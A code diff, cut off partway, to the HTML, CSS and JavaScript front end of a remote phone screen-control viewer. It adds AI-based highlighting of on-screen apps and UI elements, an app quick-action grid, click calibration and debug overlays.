@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Screen Control - Live View</title>
+    <title>Screen Control - AI Enhanced Live View</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap');
         
@@ -175,12 +175,12 @@
             border: 1px solid #444;
         }
         
-        .screen-toggle-buttons { 
+        .mode-toggle-buttons { 
             display: flex; 
             gap: 10px; 
         }
         
-        .screen-toggle-btn { 
+        .mode-toggle-btn { 
             background: #3f3f46; 
             color: white; 
             border: 1px solid #555; 
@@ -192,15 +192,38 @@
             transition: all 0.3s; 
         }
         
-        .screen-toggle-btn:hover { 
+        .mode-toggle-btn:hover { 
             background: #555; 
         }
         
-        .screen-toggle-btn.active { 
+        .mode-toggle-btn.active { 
             background: #00ff00; 
             color: #000; 
             border-color: #00ff00; 
             box-shadow: 0 0 10px #00ff00;
+        }
+        
+        .ai-toggle-btn { 
+            background: #9C27B0; 
+            color: white; 
+            border: 1px solid #BA68C8; 
+            padding: 10px 18px; 
+            border-radius: 6px; 
+            cursor: pointer; 
+            font-size: 0.95em; 
+            font-weight: bold;
+            transition: all 0.3s; 
+        }
+        
+        .ai-toggle-btn:hover { 
+            background: #BA68C8; 
+        }
+        
+        .ai-toggle-btn.active { 
+            background: #00E676; 
+            color: #000; 
+            border-color: #00E676; 
+            box-shadow: 0 0 10px #00E676;
         }
         
         /* FULL SCREEN CONTAINER */
@@ -246,8 +269,8 @@
             object-fit: contain;
             background-color: #000; 
             cursor: crosshair;
-            image-rendering: optimizeQuality;
-            filter: brightness(1.1) contrast(1.1) saturate(1.2);
+            image-rendering: crisp-edges;
+            filter: brightness(1.05) contrast(1.05) saturate(1.1);
         }
         
         /* IMAGE CONTAINER FOR BETTER CLICK HANDLING */
@@ -259,6 +282,67 @@
             align-items: center;
             justify-content: center;
             background: #000;
+        }
+        
+        /* AI ELEMENT HIGHLIGHTS */
+        .ai-highlight-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 5;
+        }
+        
+        .ai-element {
+            position: absolute;
+            border: 2px solid;
+            background: rgba(0, 255, 0, 0.1);
+            border-radius: 8px;
+            cursor: pointer;
+            pointer-events: auto;
+            transition: all 0.3s;
+            z-index: 6;
+            overflow: hidden;
+        }
+        
+        .ai-element:hover {
+            background: rgba(0, 255, 255, 0.2);
+            border-color: cyan !important;
+            box-shadow: 0 0 15px cyan;
+            transform: scale(1.02);
+        }
+        
+        .ai-element-label {
+            position: absolute;
+            bottom: -25px;
+            left: 0;
+            background: rgba(0, 0, 0, 0.9);
+            color: #fff;
+            padding: 3px 8px;
+            border-radius: 6px;
+            font-size: 12px;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-weight: bold;
+            border: 1px solid;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+            min-width: 60px;
+        }
+        
+        .ai-element-icon {
+            width: 18px;
+            height: 18px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: bold;
+            color: white;
         }
         
         /* CLICK OVERLAY FOR DEBUGGING */
@@ -274,15 +358,23 @@
         
         .click-marker {
             position: absolute;
-            width: 20px;
-            height: 20px;
+            width: 24px;
+            height: 24px;
             background: rgba(255, 0, 0, 0.7);
-            border: 2px solid #fff;
+            border: 3px solid #fff;
             border-radius: 50%;
             transform: translate(-50%, -50%);
             pointer-events: none;
             z-index: 100;
             display: none;
+            box-shadow: 0 0 15px rgba(255,0,0,0.8);
+            animation: pulse-click 0.5s ease-out;
+        }
+        
+        @keyframes pulse-click {
+            0% { transform: translate(-50%, -50%) scale(0.5); opacity: 0.5; }
+            70% { transform: translate(-50%, -50%) scale(1.2); opacity: 1; }
+            100% { transform: translate(-50%, -50%) scale(1); opacity: 0.7; }
         }
         
         /* CONTROLS */
@@ -421,12 +513,16 @@
             position: absolute;
             bottom: 10px;
             left: 10px;
-            background: rgba(0,0,0,0.7);
+            background: rgba(0,0,0,0.85);
             color: #0f0;
-            padding: 5px 10px;
-            border-radius: 5px;
+            padding: 8px 12px;
+            border-radius: 8px;
             font-size: 12px;
             z-index: 1000;
+            border: 1px solid #0f0;
+            box-shadow: 0 0 15px rgba(0,255,0,0.3);
+            max-width: 300px;
+            backdrop-filter: blur(5px);
             display: none;
         }
         
@@ -434,26 +530,222 @@
             position: absolute;
             top: 10px;
             right: 10px;
-            background: rgba(0,0,0,0.7);
+            background: rgba(0,0,0,0.85);
             color: #0f0;
-            padding: 5px 10px;
-            border-radius: 5px;
+            padding: 8px 12px;
+            border-radius: 8px;
             font-size: 12px;
             z-index: 1000;
+            border: 1px solid #0f0;
+            box-shadow: 0 0 15px rgba(0,255,0,0.3);
+            display: none;
+            backdrop-filter: blur(5px);
         }
         
-        /* TEST CLICK MODE */
-        .test-click-area {
+        /* AI DETECTION STATS */
+        .ai-stats {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.85);
+            color: #ff00ff;
+            padding: 8px 12px;
+            border-radius: 8px;
+            font-size: 11px;
+            z-index: 1000;
+            border: 1px solid #ff00ff;
+            box-shadow: 0 0 15px rgba(255,0,255,0.3);
+            display: none;
+            backdrop-filter: blur(5px);
+        }
+        
+        /* APP ICON GRID */
+        .app-grid {
+            position: absolute;
+            top: 60px;
+            right: 100px;
+            background: rgba(30, 30, 30, 0.98);
+            border: 2px solid #00ff00;
+            border-radius: 12px;
+            padding: 15px;
+            display: none;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            z-index: 1000;
+            width: 280px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
+            backdrop-filter: blur(10px);
+        }
+        
+        .app-grid-header {
+            grid-column: 1 / -1;
+            text-align: center;
+            margin-bottom: 10px;
+            color: #00ff00;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        
+        .app-icon {
+            width: 55px;
+            height: 55px;
+            border-radius: 12px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        
+        .app-icon:hover {
+            transform: scale(1.1);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+        }
+        
+        .app-icon-label {
+            font-size: 9px;
+            margin-top: 3px;
+            color: white;
+            text-align: center;
+            max-width: 50px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        
+        /* SCREEN MODE OVERLAYS */
+        .screen-mode-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 8;
+            display: none;
+        }
+        
+        .screen-mode-overlay.active {
+            display: block;
+        }
+        
+        /* ELEMENT DETAIL PANEL */
+        .element-detail-panel {
+            position: absolute;
+            top: 60px;
+            left: 20px;
+            background: rgba(30, 30, 30, 0.95);
+            border: 2px solid #ff9800;
+            border-radius: 12px;
+            padding: 15px;
+            width: 250px;
+            z-index: 1000;
+            display: none;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
+            backdrop-filter: blur(10px);
+        }
+        
+        .element-detail-header {
+            color: #ff9800;
+            font-weight: bold;
+            margin-bottom: 10px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .element-detail-content {
+            font-size: 12px;
+            color: #ccc;
+        }
+        
+        .element-detail-item {
+            margin-bottom: 8px;
+            padding: 5px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 5px;
+        }
+        
+        .element-detail-label {
+            color: #ff9800;
+            font-weight: bold;
+        }
+        
+        .element-detail-value {
+            color: #fff;
+        }
+        
+        /* LOADING SPINNER */
+        .loading-spinner {
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background: rgba(255, 0, 0, 0.1);
-            border: 2px dashed red;
-            padding: 20px;
-            display: none;
+            width: 50px;
+            height: 50px;
+            border: 5px solid #333;
+            border-top: 5px solid #00ff00;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
             z-index: 1000;
+            display: none;
         }
+        
+        @keyframes spin {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+        
+        /* APP COLOR THEMES */
+        .app-whatsapp { background: linear-gradient(135deg, #25D366, #128C7E); }
+        .app-facebook { background: linear-gradient(135deg, #1877F2, #0D5CB6); }
+        .app-instagram { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); }
+        .app-youtube { background: linear-gradient(135deg, #FF0000, #CC0000); }
+        .app-chrome { background: linear-gradient(135deg, #4285F4, #0F9D58, #F4B400, #DB4437); }
+        .app-gmail { background: linear-gradient(135deg, #EA4335, #D14836); }
+        .app-file_manager { background: linear-gradient(135deg, #009688, #00796B); }
+        .app-gallery { background: linear-gradient(135deg, #795548, #5D4037); }
+        .app-camera { background: linear-gradient(135deg, #795548, #5D4037); }
+        .app-settings { background: linear-gradient(135deg, #607D8B, #455A64); }
+        .app-phone { background: linear-gradient(135deg, #4CAF50, #388E3C); }
+        .app-messages { background: linear-gradient(135deg, #03A9F4, #0288D1); }
+        .app-calculator { background: linear-gradient(135deg, #FF9800, #F57C00); }
+        .app-clock { background: linear-gradient(135deg, #9C27B0, #7B1FA2); }
+        .app-calendar { background: linear-gradient(135deg, #E91E63, #C2185B); }
+        .app-maps { background: linear-gradient(135deg, #4285F4, #0F9D58); }
+        .app-play_store { background: linear-gradient(135deg, #4285F4, #0F9D58); }
+        .app-drive { background: linear-gradient(135deg, #4285F4, #0F9D58); }
+        
+        .folder-download { background: linear-gradient(135deg, #FFC107, #FFA000); }
+        .folder-document { background: linear-gradient(135deg, #9E9E9E, #757575); }
+        .folder-image { background: linear-gradient(135deg, #2196F3, #1976D2); }
+        .folder-video { background: linear-gradient(135deg, #4CAF50, #388E3C); }
+        .folder-music { background: linear-gradient(135deg, #9C27B0, #7B1FA2); }
+        .folder-android { background: linear-gradient(135deg, #8BC34A, #689F38); }
+        .folder-system { background: linear-gradient(135deg, #607D8B, #455A64); }
+        
+        .ui-button { background: linear-gradient(135deg, #4285F4, #3367D6); }
+        .ui-back { background: transparent; color: #000; }
+        .ui-home { background: transparent; color: #000; }
+        .ui-menu { background: transparent; color: #000; }
+        .ui-search { background: linear-gradient(135deg, #F5F5F5, #E0E0E0); color: #666; }
+        .ui-share { background: linear-gradient(135deg, #FFC107, #FFA000); }
+        .ui-delete { background: linear-gradient(135deg, #F44336, #D32F2F); }
+        .ui-edit { background: linear-gradient(135deg, #2196F3, #1976D2); }
+        .ui-save { background: linear-gradient(135deg, #4CAF50, #388E3C); }
+        .ui-send { background: linear-gradient(135deg, #9C27B0, #7B1FA2); }
+        .ui-add { background: linear-gradient(135deg, #009688, #00796B); }
+        
+        .element-checkbox { background: linear-gradient(135deg, #FFFFFF, #E0E0E0); color: #666; }
+        .element-checkbox_checked { background: linear-gradient(135deg, #4CAF50, #388E3C); }
+        .element-input { background: linear-gradient(135deg, #FFFFFF, #F5F5F5); color: #333; }
+        .element-scrollable { background: linear-gradient(135deg, rgba(100,100,100,0.3), rgba(100,100,100,0.1)); }
+        .element-icon { background: linear-gradient(135deg, #666, #444); }
+        .element-text { background: linear-gradient(135deg, rgba(224,224,224,0.3), rgba(224,224,224,0.1)); }
     </style>
 </head>
 <body>
@@ -468,9 +760,11 @@
             <button id="back-to-list-btn">← Back to List</button>
             <h2 id="device-title"></h2>
             <div class="lock-info" id="lock-status">Lock: Unknown</div>
-            <div class="screen-toggle-buttons">
-                <button id="btn-live-screen" class="screen-toggle-btn active">📱 LIVE SCREEN</button>
-                <button id="btn-test-click" class="screen-toggle-btn" style="background: #ff9900;">🎯 TEST CLICK</button>
+            <div class="mode-toggle-buttons">
+                <button id="btn-live-screen" class="mode-toggle-btn active">📱 LIVE SCREEN</button>
+                <button id="btn-ai-mode" class="ai-toggle-btn active">🤖 AI DETECTION ON</button>
+                <button id="btn-app-grid" class="mode-toggle-btn" style="background: #FF9800;">📱 APP GRID</button>
+                <button id="btn-calibrate" class="mode-toggle-btn" style="background: #9C27B0;">🎯 CALIBRATE</button>
             </div>
             <div class="status-indicator">
                 <div id="live-indicator" class="live-indicator"></div>
@@ -488,21 +782,20 @@
                 <div id="live-screen-viewport" class="screen-viewport" style="display: block;">
                     <div class="image-container">
                         <img id="live-screen-image" class="live-screen-image" src="" alt="Live Screen" />
+                        <div class="ai-highlight-overlay" id="ai-highlight-overlay"></div>
+                        <div class="screen-mode-overlay" id="screen-mode-overlay"></div>
                         <div class="click-overlay">
                             <div id="click-marker" class="click-marker"></div>
                         </div>
                         <div id="coords-display" class="coords-display">Click: x=0, y=0</div>
                         <div id="debug-info" class="debug-info">Debug Info</div>
-                        <div id="test-click-area" class="test-click-area">
-                            <h3>🎯 Test Click Mode</h3>
-                            <p>Click on the colored squares below to test</p>
-                            <div style="display: flex; gap: 10px; margin-top: 10px;">
-                                <div class="test-btn" data-x="100" data-y="200" style="background: red; padding: 10px; cursor: pointer;">Red Button</div>
-                                <div class="test-btn" data-x="300" data-y="200" style="background: blue; padding: 10px; cursor: pointer;">Blue Button</div>
-                                <div class="test-btn" data-x="500" data-y="200" style="background: green; padding: 10px; cursor: pointer;">Green Button</div>
-                            </div>
-                            <button onclick="document.getElementById('test-click-area').style.display='none'" style="margin-top: 10px;">Close Test</button>
+                        <div id="ai-stats" class="ai-stats">AI: 0 elements detected</div>
+                        <div id="element-detail-panel" class="element-detail-panel"></div>
+                        <div id="app-grid" class="app-grid">
+                            <div class="app-grid-header">Quick Actions</div>
+                            <!-- App icons will be added dynamically -->
                         </div>
+                        <div id="loading-spinner" class="loading-spinner"></div>
                     </div>
                 </div>
             </div>
@@ -520,7 +813,7 @@
                 <div class="divider"></div>
                 <button class="control-button" id="btn-start-stream">▶️</button>
                 <button class="control-button" id="btn-stop-stream">⏸️</button>
-                <button class="control-button" id="btn-calibrate-click" style="background: #ff4444;">🎯</button>
+                <button class="control-button" id="btn-refresh-ai" style="background: #9C27B0;">🔍 AI</button>
             </div>
         </div>
     </div>
@@ -549,9 +842,13 @@
             lockStatus: document.getElementById('lock-status'),
             backToListBtn: document.getElementById('back-to-list-btn'),
             liveScreenBtn: document.getElementById('btn-live-screen'),
-            testClickBtn: document.getElementById('btn-test-click'),
+            aiModeBtn: document.getElementById('btn-ai-mode'),
+            appGridBtn: document.getElementById('btn-app-grid'),
+            calibrateBtn: document.getElementById('btn-calibrate'),
             liveScreenViewport: document.getElementById('live-screen-viewport'),
             liveScreenImage: document.getElementById('live-screen-image'),
+            aiHighlightOverlay: document.getElementById('ai-highlight-overlay'),
+            screenModeOverlay: document.getElementById('screen-mode-overlay'),
             connectionDot: document.getElementById('connection-dot'),
             connectionStatusText: document.getElementById('connection-status-text'),
             connectionStats: document.getElementById('connection-stats'),
@@ -560,8 +857,11 @@
             clickMarker: document.getElementById('click-marker'),
             coordsDisplay: document.getElementById('coords-display'),
             debugInfo: document.getElementById('debug-info'),
-            testClickArea: document.getElementById('test-click-area'),
-            calibrateClickBtn: document.getElementById('btn-calibrate-click')
+            aiStats: document.getElementById('ai-stats'),
+            elementDetailPanel: document.getElementById('element-detail-panel'),
+            appGrid: document.getElementById('app-grid'),
+            loadingSpinner: document.getElementById('loading-spinner'),
+            refreshAIBtn: document.getElementById('btn-refresh-ai')
         };
 
         // STATE MANAGEMENT
@@ -578,26 +878,301 @@
             screenDimensions: { width: 0, height: 0 },
             clickHistory: [],
             debugMode: false,
+            aiDetectionMode: true,
             colorEnhancement: true,
             currentImageData: null,
             calibrationOffset: { x: 0, y: 0 },
-            scaleFactor: 1.0
+            scaleFactor: 1.0,
+            detectedElements: [],
+            appIcons: [],
+            aiClickMode: false,
+            elementClickQueue: [],
+            clickDelay: 300,
+            currentScale: { x: 1, y: 1 },
+            currentOffset: { x: 0, y: 0 }
         };
 
-        // ENHANCED CLICK HANDLER WITH CALIBRATION
+        // APP COLOR DATABASE
+        const appColorDatabase = {
+            // Apps
+            'app_whatsapp': { 
+                bgColor: 'linear-gradient(135deg, #25D366, #128C7E)', 
+                text: 'WA', 
+                emoji: '💬',
+                name: 'WhatsApp',
+                borderColor: '#25D366'
+            },
+            'app_facebook': { 
+                bgColor: 'linear-gradient(135deg, #1877F2, #0D5CB6)', 
+                text: 'FB', 
+                emoji: '👥',
+                name: 'Facebook',
+                borderColor: '#1877F2'
+            },
+            'app_instagram': { 
+                bgColor: 'linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888)', 
+                text: 'IG', 
+                emoji: '📸',
+                name: 'Instagram',
+                borderColor: '#E1306C'
+            },
+            'app_youtube': { 
+                bgColor: 'linear-gradient(135deg, #FF0000, #CC0000)', 
+                text: 'YT', 
+                emoji: '🎬',
+                name: 'YouTube',
+                borderColor: '#FF0000'
+            },
+            'app_chrome': { 
+                bgColor: 'linear-gradient(135deg, #4285F4, #0F9D58, #F4B400, #DB4437)', 
+                text: 'GC', 
+                emoji: '🌐',
+                name: 'Chrome',
+                borderColor: '#4285F4'
+            },
+            'app_gmail': { 
+                bgColor: 'linear-gradient(135deg, #EA4335, #D14836)', 
+                text: 'GM', 
+                emoji: '📧',
+                name: 'Gmail',
+                borderColor: '#EA4335'
+            },
+            'app_file_manager': { 
+                bgColor: 'linear-gradient(135deg, #009688, #00796B)', 
+                text: 'FM', 
+                emoji: '📁',
+                name: 'File Manager',
+                borderColor: '#009688'
+            },
+            'app_gallery': { 
+                bgColor: 'linear-gradient(135deg, #795548, #5D4037)', 
+                text: 'GL', 
+                emoji: '🖼️',
+                name: 'Gallery',
+                borderColor: '#795548'
+            },
+            'app_camera': { 
+                bgColor: 'linear-gradient(135deg, #795548, #5D4037)', 
+                text: 'CM', 
+                emoji: '📷',
+                name: 'Camera',
+                borderColor: '#795548'
+            },
+            'app_settings': { 
+                bgColor: 'linear-gradient(135deg, #607D8B, #455A64)', 
+                text: 'ST', 
+                emoji: '⚙️',
+                name: 'Settings',
+                borderColor: '#607D8B'
+            },
+            'app_phone': { 
+                bgColor: 'linear-gradient(135deg, #4CAF50, #388E3C)', 
+                text: 'PH', 
+                emoji: '📞',
+                name: 'Phone',
+                borderColor: '#4CAF50'
+            },
+            'app_messages': { 
+                bgColor: 'linear-gradient(135deg, #03A9F4, #0288D1)', 
+                text: 'MSG', 
+                emoji: '💬',
+                name: 'Messages',
+                borderColor: '#03A9F4'
+            },
+            'app_calculator': { 
+                bgColor: 'linear-gradient(135deg, #FF9800, #F57C00)', 
+                text: 'CAL', 
+                emoji: '📱',
+                name: 'Calculator',
+                borderColor: '#FF9800'
+            },
+            'app_clock': { 
+                bgColor: 'linear-gradient(135deg, #9C27B0, #7B1FA2)', 
+                text: 'CLK', 
+                emoji: '⏰',
+                name: 'Clock',
+                borderColor: '#9C27B0'
+            },
+            'app_calendar': { 
+                bgColor: 'linear-gradient(135deg, #E91E63, #C2185B)', 
+                text: 'CAL', 
+                emoji: '📅',
+                name: 'Calendar',
+                borderColor: '#E91E63'
+            },
+            
+            // Folders
+            'folder_download': { 
+                bgColor: 'linear-gradient(135deg, #FFC107, #FFA000)', 
+                text: 'DL', 
+                emoji: '📥',
+                name: 'Downloads',
+                borderColor: '#FFC107'
+            },
+            'folder_document': { 
+                bgColor: 'linear-gradient(135deg, #9E9E9E, #757575)', 
+                text: 'DOC', 
+                emoji: '📄',
+                name: 'Documents',
+                borderColor: '#9E9E9E'
+            },
+            'folder_image': { 
+                bgColor: 'linear-gradient(135deg, #2196F3, #1976D2)', 
+                text: 'IMG', 
+                emoji: '🖼️',
+                name: 'Pictures',
+                borderColor: '#2196F3'
+            },
+            'folder_video': { 
+                bgColor: 'linear-gradient(135deg, #4CAF50, #388E3C)', 
+                text: 'VID', 
+                emoji: '🎬',
+                name: 'Videos',
+                borderColor: '#4CAF50'
+            },
+            'folder_music': { 
+                bgColor: 'linear-gradient(135deg, #9C27B0, #7B1FA2)', 
+                text: 'MUS', 
+                emoji: '🎵',
+                name: 'Music',
+                borderColor: '#9C27B0'
+            },
+            
+            // UI Elements
+            'ui_button': { 
+                bgColor: 'linear-gradient(135deg, #4285F4, #3367D6)', 
+                text: 'BTN', 
+                emoji: '🔘',
+                name: 'Button',
+                borderColor: '#4285F4'
+            },
+            'ui_back': { 
+                bgColor: 'transparent', 
+                text: '←', 
+                emoji: '←',
+                name: 'Back',
+                borderColor: '#000'
+            },
+            'ui_home': { 
+                bgColor: 'transparent', 
+                text: '⌂', 
+                emoji: '⌂',
+                name: 'Home',
+                borderColor: '#000'
+            },
+            'ui_menu': { 
+                bgColor: 'transparent', 
+                text: '☰', 
+                emoji: '☰',
+                name: 'Menu',
+                borderColor: '#000'
+            },
+            'ui_search': { 
+                bgColor: 'linear-gradient(135deg, #F5F5F5, #E0E0E0)', 
+                text: '🔍', 
+                emoji: '🔍',
+                name: 'Search',
+                borderColor: '#CCCCCC'
+            },
+            'ui_share': { 
+                bgColor: 'linear-gradient(135deg, #FFC107, #FFA000)', 
+                text: '📤', 
+                emoji: '📤',
+                name: 'Share',
+                borderColor: '#FFC107'
+            },
+            'ui_delete': { 
+                bgColor: 'linear-gradient(135deg, #F44336, #D32F2F)', 
+                text: '🗑️', 
+                emoji: '🗑️',
+                name: 'Delete',
+                borderColor: '#F44336'
+            },
+            'ui_edit': { 
+                bgColor: 'linear-gradient(135deg, #2196F3, #1976D2)', 
+                text: '✏️', 
+                emoji: '✏️',
+                name: 'Edit',
+                borderColor: '#2196F3'
+            },
+            'ui_save': { 
+                bgColor: 'linear-gradient(135deg, #4CAF50, #388E3C)', 
+                text: '💾', 
+                emoji: '💾',
+                name: 'Save',
+                borderColor: '#4CAF50'
+            },
+            'ui_send': { 
+                bgColor: 'linear-gradient(135deg, #9C27B0, #7B1FA2)', 
+                text: '📨', 
+                emoji: '📨',
+                name: 'Send',
+                borderColor: '#9C27B0'
+            },
+            'ui_add': { 
+                bgColor: 'linear-gradient(135deg, #009688, #00796B)', 
+                text: '➕', 
+                emoji: '➕',
+                name: 'Add',
+                borderColor: '#009688'
+            },
+            
+            // Generic Elements
+            'button': { 
+                bgColor: 'linear-gradient(135deg, #4285F4, #3367D6)', 
+                text: 'BTN', 
+                emoji: '🔘',
+                name: 'Button',
+                borderColor: '#4285F4'
+            },
+            'input': { 
+                bgColor: 'linear-gradient(135deg, #FFFFFF, #F5F5F5)', 
+                text: 'INP', 
+                emoji: '📝',
+                name: 'Input Field',
+                borderColor: '#CCCCCC'
+            },
+            'checkbox': { 
+                bgColor: 'linear-gradient(135deg, #FFFFFF, #E0E0E0)', 
+                text: '☐', 
+                emoji: '☐',
+                name: 'Checkbox',
+                borderColor: '#CCCCCC'
+            },
+            'checkbox_checked': { 
+                bgColor: 'linear-gradient(135deg, #4CAF50, #388E3C)', 
+                text: '✓', 
+                emoji: '✓',
+                name: 'Checked',
+                borderColor: '#4CAF50'
+            },
+            'scrollable': { 
+                bgColor: 'linear-gradient(135deg, rgba(100,100,100,0.3), rgba(100,100,100,0.1))', 
+                text: 'SCR', 
+                emoji: '↕️',
+                name: 'Scrollable',
+                borderColor: '#666666'
+            },
+            'icon': { 
+                bgColor: 'linear-gradient(135deg, #666, #444)', 
+                text: 'ICO', 
+                emoji: '📱',
+                name: 'Icon',
+                borderColor: '#666666'
+            },
+            'text': { 
+                bgColor: 'linear-gradient(135deg, rgba(224,224,224,0.3), rgba(224,224,224,0.1))', 
+                text: 'TXT', 
+                emoji: '📄',
+                name: 'Text',
+                borderColor: '#E0E0E0'
+            }
+        };
+
+        // ENHANCED CLICK HANDLER WITH CALIBRATION AND AI
         function setupClickHandler() {
             UIElements.liveScreenImage.addEventListener('click', handleScreenClick);
             UIElements.liveScreenImage.addEventListener('contextmenu', handleRightClick);
-            
-            // Test click buttons
-            document.querySelectorAll('.test-btn').forEach(btn => {
-                btn.addEventListener('click', function(e) {
-                    e.stopPropagation();
-                    const x = parseInt(this.getAttribute('data-x'));
-                    const y = parseInt(this.getAttribute('data-y'));
-                    sendClickCommand(x, y, 'test-click');
-                });
-            });
             
             console.log('🎯 Click handler setup with calibration');
         }
@@ -608,12 +1183,55 @@
                 return;
             }
 
+            // Check if clicking on AI element
+            const aiElements = document.querySelectorAll('.ai-element');
+            let clickedOnAIElement = false;
+            
+            for (const element of aiElements) {
+                const rect = element.getBoundingClientRect();
+                if (e.clientX >= rect.left && e.clientX <= rect.right &&
+                    e.clientY >= rect.top && e.clientY <= rect.bottom) {
+                    
+                    const elementData = element.dataset;
+                    if (elementData.x && elementData.y && elementData.width && elementData.height) {
+                        // Click in the center of the AI element
+                        const centerX = parseInt(elementData.x) + parseInt(elementData.width) / 2;
+                        const centerY = parseInt(elementData.y) + parseInt(elementData.height) / 2;
+                        
+                        sendClickCommand(centerX, centerY, `ai-${elementData.type || 'element'}`);
+                        
+                        // Show element details
+                        showElementDetails({
+                            type: elementData.type,
+                            text: elementData.text || 'No text',
+                            desc: elementData.desc || '',
+                            class: elementData.className || '',
+                            x: elementData.x,
+                            y: elementData.y,
+                            width: elementData.width,
+                            height: elementData.height
+                        });
+                        
+                        clickedOnAIElement = true;
+                        break;
+                    }
+                }
+            }
+            
+            if (clickedOnAIElement) return;
+
             const rect = e.target.getBoundingClientRect();
             const imageElement = e.target;
             
             // Get actual displayed image dimensions
             const containerWidth = rect.width;
             const containerHeight = rect.height;
+            
+            if (!imageElement.naturalWidth || !imageElement.naturalHeight) {
+                console.warn('Image not loaded yet');
+                return;
+            }
+            
             const imageAspectRatio = imageElement.naturalWidth / imageElement.naturalHeight;
             const containerAspectRatio = containerWidth / containerHeight;
             
@@ -653,11 +1271,27 @@
             const finalX = Math.max(0, Math.min(calibratedX, imageElement.naturalWidth - 1));
             const finalY = Math.max(0, Math.min(calibratedY, imageElement.naturalHeight - 1));
             
+            // Store scale and offset for AI elements
+            state.currentScale = { x: scaleX, y: scaleY };
+            state.currentOffset = { x: offsetX, y: offsetY };
+            
             // Show visual feedback
             showClickFeedback(clickX + offsetX, clickY + offsetY, finalX, finalY);
             
             // Send click command
             sendClickCommand(finalX, finalY, 'screen-click');
+            
+            // Update debug info
+            if (state.debugMode) {
+                UIElements.debugInfo.innerHTML = `
+                    🔍 Click Details:<br>
+                    Screen: ${finalX}, ${finalY}<br>
+                    Container: ${Math.round(clickX + offsetX)}, ${Math.round(clickY + offsetY)}<br>
+                    Calibration: ${state.calibrationOffset.x}, ${state.calibrationOffset.y}<br>
+                    Scale: ${scaleX.toFixed(2)}, ${scaleY.toFixed(2)}
+                `;
+                UIElements.debugInfo.style.display = 'block';
+            }
         }
 
         function handleRightClick(e) {
@@ -668,14 +1302,15 @@
             const clickX = e.clientX - rect.left;
             const clickY = e.clientY - rect.top;
             
-            // Calibration mode - set offset
-            state.calibrationOffset.x += 10;
-            state.calibrationOffset.y += 10;
+            // Toggle calibration adjustment
+            state.calibrationOffset.x += e.shiftKey ? -10 : 10;
+            state.calibrationOffset.y += e.ctrlKey ? -10 : 10;
             
             UIElements.debugInfo.innerHTML = `
                 🔧 Calibration Adjusted<br>
-                Offset: +${state.calibrationOffset.x}, +${state.calibrationOffset.y}<br>
-                Click at: ${Math.round(clickX)}, ${Math.round(clickY)}
+                Offset: ${state.calibrationOffset.x}, ${state.calibrationOffset.y}<br>
+                Click at: ${Math.round(clickX)}, ${Math.round(clickY)}<br>
+                <small>Shift/Ctrl for negative adjustment</small>
             `;
             UIElements.debugInfo.style.display = 'block';
             
@@ -694,7 +1329,8 @@
                 y: y,
                 type: type,
                 timestamp: Date.now(),
-                calibration: state.calibrationOffset
+                calibration: state.calibrationOffset,
+                ai_detected: type.includes('ai-')
             });
             
             // Store in history
@@ -731,17 +1367,249 @@
             }, 1000);
         }
 
+        // AI ELEMENT RENDERING
+        function renderAIElements(detectedElements) {
+            if (!state.aiDetectionMode || !detectedElements || detectedElements.length === 0) {
+                UIElements.aiHighlightOverlay.innerHTML = '';
+                return;
+            }
+            
+            UIElements.aiHighlightOverlay.innerHTML = '';
+            state.detectedElements = detectedElements;
+            
+            let appCount = 0;
+            let folderCount = 0;
+            let uiCount = 0;
+            
+            detectedElements.forEach((element, index) => {
+                if (!element.x || !element.y || !element.width || !element.height) return;
+                
+                const elementDiv = document.createElement('div');
+                elementDiv.className = 'ai-element';
+                elementDiv.dataset.index = index;
+                
+                // Get element info from database
+                const elementType = element.type || 'text';
+                const elementInfo = appColorDatabase[elementType] || appColorDatabase['text'];
+                
+                // Scale coordinates for display
+                const scaledX = (element.x * state.currentScale.x) + state.currentOffset.x;
+                const scaledY = (element.y * state.currentScale.y) + state.currentOffset.y;
+                const scaledWidth = element.width * state.currentScale.x;
+                const scaledHeight = element.height * state.currentScale.y;
+                
+                // Set position and size
+                elementDiv.style.left = `${scaledX}px`;
+                elementDiv.style.top = `${scaledY}px`;
+                elementDiv.style.width = `${scaledWidth}px`;
+                elementDiv.style.height = `${scaledHeight}px`;
+                elementDiv.style.borderColor = elementInfo.borderColor;
+                elementDiv.style.background = elementInfo.bgColor;
+                
+                // Store data
+                elementDiv.dataset.x = element.x;
+                elementDiv.dataset.y = element.y;
+                elementDiv.dataset.width = element.width;
+                elementDiv.dataset.height = element.height;
+                elementDiv.dataset.type = elementType;
+                elementDiv.dataset.text = element.text || '';
+                elementDiv.dataset.desc = element.desc || '';
+                elementDiv.dataset.className = element.class || '';
+                
+                // Add label
+                const labelDiv = document.createElement('div');
+                labelDiv.className = 'ai-element-label';
